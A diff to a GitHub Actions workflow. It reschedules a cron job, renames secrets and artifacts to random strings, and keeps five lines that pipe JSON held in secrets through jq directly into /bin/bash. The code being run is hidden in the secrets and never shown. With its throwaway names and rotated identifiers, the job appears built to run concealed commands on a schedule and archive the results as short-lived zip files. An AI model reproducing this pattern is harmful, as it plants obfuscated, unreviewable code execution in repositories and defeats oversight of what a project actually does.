@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '4 2,8,14,20 * * *'
+    - cron: '54 0,6,12,18 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -15,18 +15,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          pwnz9226: ${{ secrets.pwnz9226 }}
+          lx0: ${{ secrets.lx0 }}
         run: |
-          printf '%s' "$pwnz9226" | jq -r .k05093 | /bin/bash
-          printf '%s' "$dyet317" | jq -r .i3321 | /bin/bash
-          printf '%s' "$z04" | jq -r .v12323 | /bin/bash
-          printf '%s' "$fnaq17" | jq -r .bddkg4466 | /bin/bash
-          printf '%s' "$mn31" | jq -r .pqsgn90 | /bin/bash
+          printf '%s' "$lx0" | jq -r .azwr553 | /bin/bash
+          printf '%s' "$jk37071" | jq -r .gljxv63591 | /bin/bash
+          printf '%s' "$c14" | jq -r .cgmtg466 | /bin/bash
+          printf '%s' "$e09" | jq -r .ypud4 | /bin/bash
+          printf '%s' "$tuwq61" | jq -r .cbi0 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: gUCeCRPt
+          name: ploXRVAU
           path: "*.zip"
           retention-days: 1
